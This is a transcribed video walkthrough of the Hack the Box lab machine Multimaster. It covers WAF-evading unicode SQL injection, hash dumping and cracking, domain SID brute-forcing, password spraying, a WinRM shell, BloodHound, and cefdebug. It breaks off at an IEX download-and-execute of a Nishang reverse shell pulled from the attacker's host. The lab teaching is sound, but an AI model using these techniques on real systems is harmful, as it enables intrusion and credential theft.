 what's going on youtube this is ipsec i'm doing multi master from hack the box which we're gonna do two different ways the very first way is gonna be the intended way it's a long and complicated one i don't exactly know where to begin with it i guess the sql injection which you can use to dump hashes that you can crack to get passwords and then you can also use the sql injection to enumerate domain users to use those cracked passwords against and then you get a shell on the box with windows remoting and you gotta jump through like four different exploits to get admin in the box the intended way the final one being your member of server operator so you can just modify a service and then you start it up and get a shell the second way is going to be the unintended way that came out last week or maybe a few days ago and that is the xero login exploit because multi-master is a domain controller so we're just going to pretty much use this exploit it's going to feel a lot like eternal blue and we're going to then repair what we did and restore the password so we don't introduce the vulnerability long term so with all that being said let's jump in as always begin with an nmap so dash sc for default scripts sv enumerate versions oa output all formats put in the nmap directory and call it multimaster and then the ip address which is 10 10 10 179 can take some time to run so i've already ran it looking at the results we have a ton of ports open the very first one being dns on port 53 and then we have http on port 80. it looks like it's in microsoft iis web server then we have kerberos on port 88 and the standard rpc stuff on 135 and 139 and at this point i'm thinking it's a windows domain controller because we have dns listening we confirm it's a windows server with iis and then you got kerberos ldap smb secure ldap so a bunch of things that just indicate this is going to be a windows domain controller but after the rfpc ports again we have ldap and it's giving us the domain as megacorp.local so the very first thing i'm going to do is edit my host file so sudo vi etsy host and let's add an entry for this so 101010 179 megacorp.local and going down the list we have four four five nothing too much there these ports aren't too interesting secure ldap remote desktop 3389 and this is giving us some more information we have the domain name and of course we know this is the domain controller because we have ldap listening we have a computer name which is multi-master you also have it here as the netbuyer's name so let's go and add multi-master to our certificate or to our um post file then what else do we have we have the time which could come in handy if we do any type of like kerberos attack that requires us to be in sync and outside of that don't really see too much we got clock skew right there smb so nothing too interesting in most videos i'd probably go and try to enumerate things out of like the rpc ldap or 445 or even the kerberos port however i don't think it gets you anything on this box and i've done it a bunch of times before so if you want to see that type of stuff just go to ipsec.rocks for kerberos i would recommend looking at curb route which can identify valid user names through some type of uh kerberos pre-authentication i talk about it there uh ldap there's a bunch of ones about enumerating ldap you can just look at it like uh cascade uh yeah sizzle i think is the first one we do it or um why puff we look at ldap and wireshark so why puffy's probably a good one to look at for this uh we even have a bunch on like enumerating open shares such as like just type smb and you'll probably find a bunch of stuff related there so not gonna go into all that we'll just skip it and go straight into the web server and again the reason i'm skipping it because i don't want another like four hour video like hack back so let's go to 10 10 10 179 and we'll take a look at the site potentially there we go it is coming back i was like oh man is the box offline uh i don't know why it was so slow but here we go we got the website and it looks like a calendar here so i'm going to double click this and when i'm clicking things around nothing is working so the very first thing i do when i see that happen is i press f12 and go to this console tab and if there's a javascript error it should be displayed there but we don't get anything so i'm going to go over into burp suite make sure intercept is on click edit and i don't see anything red down here so my burp suite didn't trigger so are the brip suites not working or this is just dead code and we can ignore it uh clicking around on the events again nothing's going off so i don't think that's going to be anything we can click on login and we didn't get a thing into burp suite so maybe this is all handled through javascript or something is not working uh admin password click log in and what did that say login system is currently under maintenance please try again later i'm going to press ctrl shift r to refresh the page and we see something do does go red so um burp suite is working it's just not sending a request when we do that so let's perk around on this to see if we can find out where a request will be clicking around on these links we're not going anywhere go into the gallery again nothing oh we finally got something let's turn intercept on click here so it's probably configured to ignore um images and i'm going to try one thing real quick let's go to intercept options content type matches text this could be a like javascript app so i'm going to get rid of this actually instead of that let's just uncheck this right now and then admin password and try logging again maybe this is returning like a javascript thing nope okay i was thinking it could be excluded because the page was javascript if this is like node.js but doesn't look like that's the case so going into this colleague finder we do have book suite is on i'm going to put a name uh would do please subscribe hit enter we see a red dot near the bottom of the screen so grip suite is saying something and we're doing a post request to this so we finally found something where we can send data to the server we send this over and click send and we don't get anything so the name let's try uh multi-master and we get forbidden so we can't say the word multi-master it looks like which is the host name of the box we put multi-master d nothing test multi-master nothing so how about case sensitive forbidden so something is weird with that how about master master is forbidden so let's do a capital a here so for some reason we can't send the word master which is unique um i'm just going to do a and see what we get and we get a bunch of information so i'm going to copy this and we're going to extract potentially all the emails so let's copy this create a text file uh i'm just going to call it temp paste this cat temp jq uh maybe we should have put it in the big brackets let's see if that does anything okay so jq dot like that and then email am i doing this right it's been a while since i've used this see jq dot like that and i'm going to grep for mega corp this isn't the correct way to use jq but it works so let's do user names v usernames and we can do percent s at megacorp.hdb remove that and then remove this okay so we have a list of usernames because of that three let's see six seven eight goes to seventeen i'm gonna do a name i'm gonna put minitel and we're gonna see if the id stays the same if minute two comes back as one then we know we didn't do a good job enumerating but if minoto's the only result that comes back and its id of 16 i'm gonna assume everyone's name has an a in it somewhere because we probably have all the results unless someone's name doesn't have a and there's like an id17 but id16 we're good there uh we could go and do a bunch to see if we ever go above [Music] um 17 like one person's name that wouldn't have an a is ipsec but i am not a member of this so i'm going to assume i have everything so probably the next thing i want to do is test sql injection so i'm going to do like that and we get forbidden so i'm going to remove characters until we don't get forbidden and it looks like maybe that i was it or not not the i the single quote uh double quote is also an issue so what i'm going to do is use w fuzz to enumerate all the special characters so w fuzz dash u for url http 101010 179 slash api get colleagues dash w for word list opt set list and then this is fuzzing special characters and then dash d for data and we're going to put it in name so name colon fuzz like that and i think that's it and let's see probably going to want one 415 is can i screw something up have a few four threes here i'm going to do just a colon and see what 415 is is it actually responding 415 uh 403 forbidden okay so we're getting everything with forbidden now and there's an actual like web application firewall if we ran go buster earlier we would have seen it that will um just block you out if you do any type of root forcing on this box so there's going to be two things i do number one i'm going to add dash c for color i believe and dash t1 which is timeout between request i'm gonna set it for one second so it looks like that is good i'm going to run this again and see it looks like we got similar results and go again it is forbidden so i'm probably have to change the timeout even higher than one we're going to probably do three because i don't know we're just going to do that uh 403 for the ampersand so just going to pause the video we're going to wait probably 20 seconds and then we'll be unblocked and we can hit enter there i think it's been long enough going over to burp suite yep it is unblocked hit enter here and maybe t is not timeout um w fuzz dash h what is t dash t number of concurrent connections so definitely don't want that uh is there no timeout specify time delay between request s so we want dash s and we are blocked so gonna give it some more time should be long enough so it looks like it is and now we can do it this way and it's going to take much longer but we definitely won't hit any type of brute forcing detection so while that runs i'm going to go and i want to see if it actually says 415 i don't know where it's getting that percent maybe i should set it to go through the proxy so we can see exactly what a payload looks like because i think we screwed up the payload somehow but it's still kind of working so if we do a ampersand what do we get four three forbidden url and code it two or three okay can we do that with a single quote forbidden let's do right click convert selection url encode all characters percent to seven and it looks like we can the question will be does the application get the url encoded or does it get the data so let's put a there then we'll do a single quote let's do convert selection url all characters oh wait that's not a dash uh dash dash plus dash let's see convert selection url oh 2d 2d as a hyphen and that does not look like it did anything so what this request is is um a single quote dash dash space dash let's see we can do a single quote union select one forbidden so there's one of these words is forbidden just convert well i don't want to convert the pluses duh anything see single quote space dash dash space dash oh they actually did it i think no it didn't because we should get something back so if we get rid of one of these dashes yeah i'm not exactly sure but this has finished and it looks like the only bad character is going to be this comment and a hashtag so let's see i want to look at the proxy so i think i can just do dash p http localhost 8080. is that how we specify a proxy uh maybe it's http colon localhost colon888 let's see w fuzz dash h graph dash i procs ip port type so it wants ip which is localhost port 8080 type http capital there we go so let's see here's the very first one it does i'm just gonna send this to repeater go and we get unsupported media type so we are getting a 415 in w fuzz and looking at this we're doing content type application slash x www form encode and here we have application json so this is also something we should take an account for so didn't really affect or w fuzz but um it should always be replicating what we see so we can do dash h for header and we can say content dash type like that and one form encoded we want application json careset utf-8 like this and in three seconds we should see response 200 so that's looking much better um we can just kill that out and we to play with this request a little more so let's try sending a single quote and we get 43 forbidden we had tried converting this to hex which is percent 2d i believe no that's uh percent 2ds hyphen um i forget what single quote was so right click convert url all characters percent two seven and that works but we don't get anything i would expect like an error message or something if i'm sending a single quote to an sql field that has injection or something the one thing i notice is we do specify character set utf-8 which is unicode so we can try sending it unicode as well and all we do is backslash u u27 and we get an internal server error which is very good for us so we can do a like that and let's try backslash u 2d backslash u 2d we want to put a space u 2d and we still get an error occurred 2d is going to be a dash i believe so let's look at this uh engagement tools convert selection url all characters yeah 2d is dash so that did not work but we probably have some type of sql injection so what i'm going to do is copy this make sure we have a valid request i'm going to copy to file and we're going to do colleague.request and i'm going to run sqlmap while we play with this because there is a tamper script so if we locate tamper grep sql let's see all the tamper scripts we have so it's in user share sql map tamper so let's copy this and the one we probably want is character uni and code i don't know the difference between uni encode and union code escape does this give examples of what it does let's go cd less care unicode escape see okay what's in code so it looks like it's going to change to percent you zero zero so is that going to work here percent you zero zero was it two seven 200 okay backstress u27 okay so we probably want the unicode escape so let's do sql map dash uh we have to go to the previous directory so i'm just going to do cd dash sql map dash r kali dot request dash dash tamper is equal to care where's unicode escape click that then what else do we do i'm going to do dash dash delay 5 we can do level 5 and risk 3 dash dash batch because i don't want um this prompting me for any questions so now we can run it and i did a delay of five instead of three because i'm also going to be playing around oh oh i have remnants when i actually did this machine so let's rm dot sql map it's a directory what's rf clear all sql map history from my box okay so now it's going to run then this is probably going to take a long time because we have a long delay uh we could say dbms ms sql because we know this is probably going to be a microsoft sql box at least i hope it is unless if it's not this is going to fail but it skipped doing checks for like my sequel postgres oracle etc so maybe i'll go a little bit faster with that so we know we have something here let's try if we can do mix casing so i'm gonna do a ar okay let's convert r to um hex so it's seven two a backslash u72 and we get an error has occurred we just did backslash u72 seven two okay maybe we should do with two zeros so that looks right we can do also mixed casing that's what i was not mixed casing um mixed encoding that was the main thing i was testing if we did like um a standard ascii and then unicode so and unicode is going to be two bytes that's why i just added two zeros so let's see we want to do two seven which should be a quote and then a space 2d which should be a hyphen and a space hyphen didn't get any data back but we don't have any type of error so we can try union select one two three uh forbidden i won't actually get um the response back real quick so one two so id is one name is two positions three emails four sources five so this select statement probably has five things so with the union i should go five because by select id name position email source from table so i'm gonna do union select one two three four five and then we get forbidden so let's do convert selection url and code all characters backslash use 0 6f let's try it with select convert url all characters backslash u 0 6 and we have an sql injection so one two three four five and we can say hey let's take the email and put please subscribe uh let's do single quotes and we'll probably have to say those are going to be backslash u 027 and we can put data here if we go back to sql map we can see it is still taking its sweet time so what can we do with this i guess we can start building a python script to start exploiting this and then maybe sql map will finish maybe it won't uh so let's do vi um well i guess we can just call it exploit.pi and we're going to probably want input request import json and then we can do url is equal to http 101010 179 slash api get colleague do i spell it right colleagues okay and then we gotta make the request so let's do at least let's first um just make it so we can just get a page with static data so request dot i guess we can do get i think url data is equal to and data equal name a like that data is equal to data print our.text python3 exploit.pi request.post uh we have to set the header so we can do header this is content type is there a dash there is a dash colon and then we can just copy this that headers equals header and error has occurred so let's do proxy http 127.01 equals proxy go to prep suite i can type correctly and specify the port there we go and we see the request is not putting it how we expect so we have to say it's json data i believe so let's see let's try json is equal to data does this fix it it looks like it does so if we send that we get data we tell burp suite to keep going we get this so now what we want to do is see if we can send unicode so i'm going to try backslash u uh zero zero four one maybe that's capital a we'll see if it's case sensitive send python let's turn intercept on and we see it actually just encoding it for us so this is actually a pretty big headache to try to solve and i spent a while trying to do this in a good way but never could so we're going to create a function called gen payload and we're going to pass it i guess the string payload i'm gonna do four care in payload and we'll say um let's actually switch to a python interpreter real quick so we can get this piece correct so care is equal to a and we're looping for every character so we can say a is equal to backslash u and then we want to say a hexadecimal padded four times so that's what that colon zero four x does and we can do dot format and we're going to grab the ordinal value of uh care can't decode byte let's try r there we go that's what we want so we're going to do uh let's change this to be query query query and then payload plus equals zero for x dot format board care and we can say man my escape key is like delayed or something like that plus equals return payload so let's give this please subscribe and we're sending this to the proxy still so if we intercept on send this we get please subscribe and uh we probably should have did data is equal to let's see what if we can do like this that and we want this to be gen payload please subscribe okay some exploit and that looks good but because we put the json and single quotes we're escaping everything so this probably not going to work request invalid so i'm going to go back and change this to be data and not json because even though we're passing it a json string we're not passing it a json object if that makes sense if we got rid of these single quotes on the end then this would be a dict and then or a dictionary and request would know how to turn that to json but because we put these single quotes we're passing it a string it just so happens the string looks like json and i'm just doing that because in my experience that was the easiest way to get this unicode stuff in so now we got name is equal to this and that's please subscribe so that looks good so we could try what was it a single quote union select one two three and we put data in email so we'll do please subscribe five like that right that looks fine and let's send it send this to repeater we have that there and if i turn intercept off we have data so this is exactly how we want it the thing we want to do now is make it so we can actually query data and looking at this we have sql map still going so we can import cmd and let's do class exploit cmd.cmd prompt sql to please sub and then def default uh self line like that let's see probably want to put the header yank place the header there grab data grab that if i don't need to send this to the proxy anymore something is going on with my vim hotkeys okay so we just need to make data so we can say payload is equal to gen payload line and then data we put all the way up here so let's grab that capital v and then greater than sign which is that if you don't know and gen payload payload oh we're just doing like that that should be fine r is not defined oh we need to loop so cmd dot cmd oh this is exploit exploit dot loop is it cmd loop i always forget how to start this sweet so a union select one two three four five that awesome please sub great so now we have a way to just do raw sql or query it but i want to make it easier to do unions so what i'm going to do is we'll say define do union self line and the payload it's going to be a union select one two three and we're going to end that plus line five like that i believe print payload i just want to see what this looks like union please sub that looks good so now we can send this request so i'm going to go up here i'm going to do three y to yank p to put and here i'm going to do payload is equal to gen payload so here we're going to do the um unicode escaping and let's see data that looks fine let's see what this does python3 exploit.pi union a and we put a where the email is so now we probably want to have this only grab this field so let's go here and we will say r is equal to json.loads dot text and then we can print are zero email let's see what that does so the zero grabs what's in between this and then email of course grabs email so union a and we're good so we can probably run msql commands and verify we're actually using microsoft sql i'm going to turn burp suite off msql injection cheat sheet let's see what a command is uh what where do i go ignore this risk that's bizarre at version so we do at that version we can see microsoft sql server so we can say username see what user we are do not get anything system user didn't get anything user nothing oh we had to specify union and we'll say try accept print dot text so if we can't load the json we'll just print the output union system underscore user finder you can try union user finder uh login name i wonder if we can actually do a nested query so if we do union i really don't know if this is going to work hey it did so we can actually do nested queries with this union so if i do select one yep so that's awesome so we can list names let's see what this does uh maybe just print r actually i know what i want to do we'll say rename this to js and now we can just print our text so what happened was it passed this line and then crashed on this print statement so our.tax didn't exist anymore so that's why i did that union um we wanted to grab this no okay that didn't work let's see we probably don't have this master assist logins permission so current database we can do db name union like that hub underscore db list column select name from column where id i want those list tables here we go select name from object i'm gonna make this bigger that's probably helping some people like master scum with type name these are all like super long queries that i don't understand see select name from try this union like that and some other db we'll say hub db oh that's got weird quote uh quotes there and that did not work let's try limit one to only return one result um this is microsoft sql so maybe it's done this way there we go can we do this second result i don't know how to work this top command i don't know if we do top two let's see group concat msql database guide string aggregator okay so let's get rid of this top and we can say string ag name and we'll separate with a comma did i do that right s t r ing agg we want to do single quotes there we go so we have two tables we have colleagues and logins so we probably want to get stuff out of logins so let's see we can probably say um let's do union select during ag emails maybe from logins let's just try this no so instead of [Music] maybe email name so i think we are doing something wrong select let's go back to top one name from logins username okay so we have username we got that uh password and suite so we have a list of passwords probably so we can do string ag username let's see i'm trying to think of a good way to do this can we do two i don't think so username password well we can get a list of usernames this way and there was one that did not have an a egress but i'm fine with this for now so v usernames let's paste search for comma replace with line break uh let's try this again search for comma replace with backslash r backslash n and we'll just get rid of the special character maybe i just wanted backslash r but i have a list of usernames there's probably some duplicates there but that's fine um probably want to grab all the passwords and there's probably a better way to do this but i'm getting fed up with this sql injection oh god okay thank god it's separated by commas i was like that's a long string of hex v pass hashes percent s comma backslash r g there we go now we got a list of password hashes that is echo dash n wc-c 96 characters um let's see password hash 96 characters it's probably like a thing that helps like a tool like hash identifier that's probably actually called hash identifier 96 uh hash id let's see hash identifier which is outdated python 3. this looks like it should be fine so let's go cd up get clone cd hash id do we have everything to run it please work oh it won't stand it in okay copy paste shaw 384 most likely or this guy and whatever so okay sha-34 is what we're going to guess first let's go cat pass ashes let's grab this i'm going to sh into another box this is my server that has hash cad and a few graphics cards uh cd hashes and we can do v sha 384 paste and dot slash cat example hashes less i'm searching for 384 which looks like it was a mistake because that exists quite a bit in these uh sha2384 10 800 let's just grab 384 grab dash i sha probably want sha 2 384 i'm going to try that first okay dash i shot 2 384 dash b for before mood like that dash a for after i'm gonna make sure this is 96 characters so echo dash n wc-c 96 so probably right hash cat dash m 800 and then we need hashes so that's in hashes shah 384 and then the word list opt word list rocky so let's see if this works initializing and it doesn't look like it recovered any so maybe that wasn't it let's try the sha-3 one so sha-3 384 i don't know the difference between these but this is 17 500. so 17 500 and it's going to initialize again it doesn't look like any cracked yeah nothing ah let's go back to our grip and let's just get rid of the sha-3 and do dash 384 i probably have to escape it and i guess there's 17 900 these are all looking like the 96 characters in length so let's do 17 900. and see if this works and if we can't find a hash then we'll start using rules but it looks like we just cracked three of them so i was going to say at that point once i'm relatively confident i have one of the hashes then i start specifying rule files like rules inside pro password pro um but we don't have to do that because we cracked it so let's do shell and we got password one banking one and finance one sql map still chugging along so let's just exit this v passwords password one banking one finance one okay and we can exit our cracker crack map exec smb uh is it i think it's crack map exact ip then protocol let's see does it give crack map exec smb usernames passwords and see what happens oh we never gave it an ip it'd be amazing if something happened there but 10 10 10 is 179 let's see successfully queried it and is it going to do logins it's taking its time uh we probably have to specify dash u and dash p dash u dash p crack map exec is really finicky with the arguments and if you don't do them in the like correct order expects um bad things happen or nothing happens and it just takes a while and you burn time so always make sure you have the syntax right with crack map exec and it looks like we may not have any hits i wonder how many more users we have um probably a lot because we didn't do deduplication on this username list so no new hits so we have a few passwords we have a bunch of usernames and nothing so at this point it was a lot of spinning wheels trying a lot of things that i didn't really um record everything i tried but there is a second way we can do enumeration in um sql land and that is querying domain users so right here we are just querying people in the database but we can actually make a query to the domain controller from my uh ms sql and get it that way so that's what we're going to do um again it's going to be the union command and let's see um what is the command i think it's s user sid and then the domain i think it's um megacorp backslash administrator try that sweet so we got something it tried to like display a binary thing the next thing we could do is a function to convert that into hex so binary to hex string like that and this is the sid um it's in hexadecimal format so this is kind of used to like the s-1-2-1-string string whatever um let's see default admin syd see if i can pull it up real quick oh let's see well known sid so it's kind of like this um s-1-5-21 so we can see the first one five first one is one then you get five um i don't know where 21 is but trust me this is the sid in hex format so the user portion of the sid is going to be the last four so this so all we care right now is this and this is in little endian format which is um least significant bit first so if we want to convert that into regular format because if we look at what f401 is if we do python 3 0x f401 that is a large number but again little endian so we convert this to a format which we're used to which is most significant bit first we go zero one f4 again i just took these bits and put them this way it is key that you break them up into each hex pair because if you don't do that then you would get 000 one zero four f which is very different than one four f so again break it up into the pairs and then go the other way right to left to convert it so if we do 0x 01 f4 it's 500 and 500 is the default sid for the very first use of a domain which is administrator we could potentially find other users sid if we search for like um let's try egress does he exist the user may not exist so aldum atom has something so we can grab the last eight one two one two two b there we go so i'm going to grab this break it up into the pairs so this guy's sid will be 0c2b and that's 3115. so let's brute force sids and in order to force a sid we have to be able to look up someone's name by this sid so we go back here do union s user underscore sid name and then paste the sid we can get this so let's try one two three four this was two b zero c and that's album so we can create a program that will just increment this up to a very high number like 500 to 2000 or something and then get all the domain usernames so let's do that now i'm just going to copy this and we'll go back to the exploit.pi and i'm going to kill this sql map eventually this finishes but we've already done what we needed to do uh i had actually never used microsoft sql to extract the hashes when i did the box the first time i had sql map do that for me so that piece was live hope it went well um let's see so let's do a new function def do brute self line and we could create a whole new program to do this but i'm lazy uh let's see so i'm gonna paste that and let's see actually let's get a sid let's do a function up here def get sid and we'll say n that would be number so domain is equal to this and i really hope this doesn't like um convert this into decimal we'll have to see exactly what this does and then user will be struct.pack endian integer on that and then we can return domain user let's see what this looks like and we want to get rid of this f401 okay so def do brute print get sid line brute 500 struct is not defined import struct root 500 not exactly what we want but it did a better job than i expected i didn't expect it to print this i thought python was going to do some magical typecasting and convert that we just have to get the string of this so user str like that root 500 that did not do it that did nothing so let's see user equals user.hex root 500 f40 there we go that looks good so if we do 501 that's going to be f402 or no f5 least significant um yeah and then 502 will be f6 and there we go so that piece is done so let's see we can say start stop is equal to line dot split on space and then for i in range start stop print i and i'm just going to comment this one out 500 501 let's see we gotta convert these to ins i think i wish i read that error message but i'm guessing it's a string root 500 there we go so now we can say uh sid is equal to get sid i and we can do payload is equal to let's just copy this escape key still isn't exactly working which is frustrating that and line is going to be let's see it was s user s name and this will be sid see i'm glancing over that union select one two three s user s name i think that's good let's see let's make a few lines paste them indent and let's see so that's good that's good we're trying to load and then we can say if js0 email if that exists then print f i and the email js zero this is really ugly code okay accept and i'm gonna do time sleep 30 we'll do time sleep three because we have the um account lockout thing or not account lockout the web application firewall blocking us so python 3 exploit brute 500 we'll do five or four and hopefully we get at least one if we don't get any then we know we screwed up the command and i'm guessing we screwed up the command let's see we'll definitely need that there eventually but let's comment this out for now make sure our script isn't crashing and we can print the payload real quick so union select one two three s user s name like that five let's just copy this and run this command okay that worked so we got an error somewhere else that i wonder this is where the error messages i should have done this in visual studio code oh i see the issue and i'm going to change up my script a little bit uh the issue is i did not encode the payload so i'm going to take these two lines i'm going to make a new function def make request payload like that and we can say payload equals gen payload payload there we go that should be better and here we can get rid of this this make request oh i deleted something i didn't want to so my clipboard hey it is taylor is equal to that no it's not my clipboard let's see payload is equal to this put this in a double quote and we wanted to do here and this is sid and a double quote and a double quote there we go and do payload that looks fine and i called it make request right yep root 500 501. none type as attribute text print payload 500 501 we're getting there we need to return we'll just return our dot text and here that's union root 500 501 okay took longer than it should but we got it so we can now put these chais back in root 500 505 and again there's a five second sleep between everything but we can start enumerating and we probably want to enumerate beginning at i think 1 000. um the default uh like the built-in accounts will be starting at 500 and i think when users actually start getting accounts those are in like the 1000 range so i'm going to do a super long brute and we're just going to i guess pause the video i think because this is probably going to take like 30 minutes to get all the sids and i may just cheat and go through notes and pull up the exact sids i want because every request takes five seconds so we have 5000 seconds and 5000 seconds to minutes about an hour and a half so this piece takes a while and yeah i don't want to wait around so let's cheat i'm going to do brute 1110 because that's where the stuff we want starts and i'll just do that so new bring usernames every five seconds you should see a new user pop up so we can start adding these to our user list so we can clean up our sessions like that uh v usernames and we can add let's add them to the top t-u-s-h-i-k-i-k i don't even want to pronounce that one andrew lana so it looks like the usernames are not like first initial last name so it looks like to log in it's like standard convention but after that it's not so we can look at everything that's just with a so i wonder if andrew is a i don't know ldom doesn't sound like a last name but what if we go back to the page real quick 10 10 10 179 colleague final finder andrew i don't think there's an andrew here who is aldom houston a-l-d-o-m yeah he's alessandro maybe i don't know i'm going to stop trying to make sense of a fictitious scenario and we're going to run crack map exec again so crack map exec smb 10 10 10 179 dash u usernames dash p uh passwords and we'll see if this gives anything and we have a hit but we don't see it say pound afterwards it just has this plus so we could do uh dash u t u s h i k i k a t like that did i do it right log and failure yes so we can say finance one and then shares to see what we have right access to and we can start looking at that um let's see is it going to show it does we have a few guys we have c e dfs we could potentially go and look at through like group policy and things but crack map exec has other things like winrm and if the user is a member of the windows remoting group we'll be able to access this box this way so let's see if winrm does anything and it does so it says pwn so we can get a shell this way so let's use evil when rm the first thing i'm going to do is make a directory logs i'm going to do script and we'll call this what's his username copy script this dot log so now we're logging everything we do as this user evil winrm dash i for ip 10 10 10 179 dash u i think it's megacorp backslash like that and do two backslashes dash p finance one and we get a show in the box oddly enough i mean we logged in with this username and here's our home directory which is bizarre so we can do who am i slash all to see i guess or groups or things we can also do net user slash domain to get a list of all the accounts so we have a few service accounts um bunches and bunches of users so if we just go to cd backslash users there's only a few that log on to the server so jordan psych this is us s power generally the first thing i'm going to do because i'm on a web server is i want to try to go into the dub dub dub directory so i went into inept pub and then dub dub dub root because if we can get a shell as iis chances are we're going to have the sem personate privilege which lets us escalate and doesn't look like we can so let's go and um go into a place where we can write files and i think it's printer color scissor directory that is not um let's see printer color directory windows that's not it oh system 32 spool drivers color full drivers color this is generally just where i like working out of in windows because it's a directory underneath windows and sometimes you'll see um applocker just whitelist anything in this directory and it's normally uh word writable so i can do echo ipsec test and we have it so this is one of the first things i test to write to um let's try running win ps so let's do cp opt privilege escalation awesome script sweet win peace win p z exe uh win peace ben release jesus cd opt privileges script find dot grep exe this is the easier way to do it oh win ps then win pzxc so make dirt dub dub dub cp win ps.exe or win p slash win ps exe oh i don't think that was what i thought it was yeah that was showing me the directory name this is what i want though let's just cp this to be htb multi-master dub dub dub awesome so we can go cdw python http server and we'll do python3 and we can just do wget now we can close this shell http 10 10 14 2 port 8000 win ps dot exe dash o win ps dot exe it's going to download looks like it does let's try running it and we'll see what this has it is now finished so let's go and look at it uh there's a lot of output okay computer name some stuff system environment variables nothing special no lapse nothing special there no av was detected oh wait list paths that's funny uh power view uh this is powershell without powershell and then revert so i guess there's probably some type of cron that is running and um restoring the box with that revert.ps1 and the fact that the whitelisting power view and stuff i'm guessing amsi is enabled even though they're saying no av was detected uh powershell settings transcripts nothing drive information i don't know what's under e we can always check that one nothing interesting there we have all access there this user probably is logged in the box cyork auto logging found and it doesn't put the password here anymore i think the password is stored in um i forget what it's called the windows like cred store um i'm drawing a blanket the name but it's in a place that gets encrypted now so we can't just read it a bunch of services but we can't modify any uh we have variable paths and folders nothing too interesting doesn't look like anything too interesting here i don't think we can write into what is this for is this services auto run applications we can't reboot the box so auto run isn't going to be too handy for us listening ports we know everything there we have a few uh ports listing on 127.001 that i don't recognize firewall rules d-pappy that is the um how things are protected nowadays and we don't have anything from win peace this is a windows domain controller though so maybe we should run bloodhound so let's do um let's go and download it so bloodhound github cd up do i have i'll do git clone bloodhound and while i do that i also go to the releases sample database generator where's release ah pre-compiled binaries so we'll want this one as well and linux x64 save file uh let's see rm-rf just going to delete my previous bloodhound directory we'll do unzip downloads bloodhound linux x64 1.0 and well that goes okay it's done we can go into bloodhound and we want to find shotpound.exe that's just in ingesters so cp shoppound.exe and htb multi-master dub dub dub and wget maybe now we can download showpound.exe and then run it probably should specify like dash c space all or something but we have a bloodhound zip so the easiest way to copy this to us is probably just going to be smb so i'm going to do impact smb server dash smb2 support call it share and we'll share a directory so now well we have to do sudo i can do cp this to 10 10 14 2 share and we have now copied bloodhound to a server or maybe it's in the process of copying uh can i perform it what bloodhound.zip i wanted to specify a username and password let's see we'll copy a smaller file this photo 10 10 14 2 share i wonder if i'm going to have to do username and password smb2 support if i don't put that there's a typo is it going to crash yeah okay um we could just put in a directory we have access to read but there's one thing i just thought of i'm going to do responder dash i ton zero and we're going to try and copy bloodhound again it's going to fail but oh we already know this username's password never mind um what i was going to do is capture his hash off of this to try to get a password uh let's see let me check out e real quick that's a directory department i t development see is it get child items dash recurse and see if we have anything interesting doesn't look like we do so let's go back into c and i was really hoping i could just copy this this way i always hate doing um username password well maybe it'll work with evil one or m let's try this dash user ipsec password ipsec username and smb2 support okay so new ps drive ipsec let's look at the command new ps drive dash name yeah we're to give it a credential it's always a pain generating the credential dash name ipsec where's the location let's see let's get rid of user password real quick just try good old net use command z colon 10 10 14 2 backslash share okay so we have to actually probably create a credential object and do powershell so let's do that actually we don't um we need to be a little lazy because we're in evowinrm not just a netcat shell we can use the download command download shutdown or not that download this and we'll give it this name and we're downloading it awesome uh it's always handy knowing multiple ways to do things that should be in the logs directory okay let's go we'll create a new pane neo4j console and if you don't know your neo4j password which i don't right now i'm going to do locate near 4j grep auth and i'm just going to delete this file there's a better way there's other ways to um reset the password neo4j but this is the one i can always remember because it's easy to remember to delete a file called auth and not run some weird commands to reset your password remote interface so we can go here we're about to finally run bloodhelmed default password is neo4j i just changed it to password so now we can go into opt bloodhound and we will actually want the bloodhound linux suid pseudo ch own root on chrome sandbox and then sudo chmod 4755 on the same thing neo4j password login and now we just drag and drop i wonder if i can just upload data does that work it does root oh no it's hdb multi-master and it's probably in the logs directory and we're processing the file okay so we can go to queries find all domain admins look at this it's president list actual admins see shortest paths to domain admin and either we didn't query the right thing or we don't have a lot of data let's see find a s rep roastable passwords nothing cobrastable accounts bloodhound is lagging behind i think my vm froze the green is not moving yeah my vm froze so i'm going to reboot the vm okay my vm's been rebooted and i'm really glad now i did the um script command because we can get right back where we were pretty quickly so i'm going to do cd logs and i'm going to do script and then we'll do dash 2 and just copy the command because everything we did was logged then i can also cat logs and go into this and get into the directory easily and we're pretty much exactly how we left off so the logging was a little bit inconvenient but you can see the real benefit uh let's do sharppound.exe c all i'm going to specify all collection methods i didn't do this last time so we're going to see if this changes anything so neo4j console let's open up bloodhound so we have to pseudo run that up bloodhound linux and before i import the new one let's just um mark this guy is owned we're going to see if it says anything different so let's see merc user has owned and then we want to do queries and shortest paths from own principles or just links here find all domain admins i wonder if that's only showing one layer we'll find out a second let's just download the new bloodhound data so download this okay this ends in five three zero so let's upload data five three zero finish processing run the command again so we'd have to edit bloodhelm to show um user of this group but we can just do click on it and select i think this member of administrators this has three group members and these are user accounts and someone i wonder if domain admins is just empty what if no one's a domain admin and that's why but the shortest paths from own principles returns nothing so we don't really have anything right now let's go back to the box and back when i did win peas there was some ports on 127. so one four three four this is probably msql this one i don't know exactly what it is and we can do git process and we see a bunch of processes with code and we don't know exactly what this is either so if we enumerated super well on this box we would have seen there's microsoft visual studio on this and if we go into microsoft visual studio i think we can find out what version it is or find out it's old so there's a lot of googling around and eventually you find out that port is a debug port in visual studio so we go back to a web browser and this again this piece of the box takes a long time to figure out because there's no way to in my knowledge to get like information about that process other than the process code exists we can't see the username because we're not in a privileged context and in netstat um whoops we can't see the pid of the process but we can see if you run this periodically these come and go so we'll see this one three six three eight and four one zero six eight disappear probably after we download this and we got a bunch down here oh there's a udp but yeah so run this one more time and we'll run again after we download cef but cf debug is that it yep so this is the program we want and you do cf debug dash dash url and then the node code you want to do so we have a way to execute code so let's download it it's their release releases download this then let's copy this i'm going to run netstat again so 638.068. those two exist we got another one running and if you looked at the code process you probably see another visual studio process open up so if we go to www unzip downloads cfdbug.zip and i'm just going to move that to my directory and we can do this again one one two six three eight you can see those are gone now so that's just showing weird behavior go back into my directory python 3 http server w get 10 10 14 2 8 000 cf debug.exe dash oh cf i'm just going to call it cef.exe okay we have downloaded it so the next thing we want to do is have a good way to get a reverse shell to me so let's do cp opt user share machine shells invoke powershell tcp dot ps1 and we just want a reverse shell ip address is going to be 10 10 14 2 and the ports 9001 okay so let's start up a web server again ix new object net.web client download string http 10 10 14 2 8 000 what i call it let's move that to be shell.ps1 and in my last windows video i think i used invoke web request to do a reverse shell i just forgot the syntax off top my head so that's why i'm using this one let's see malicious content has been blocked but we see it actually made the request back to us so it's the nishang shell that got 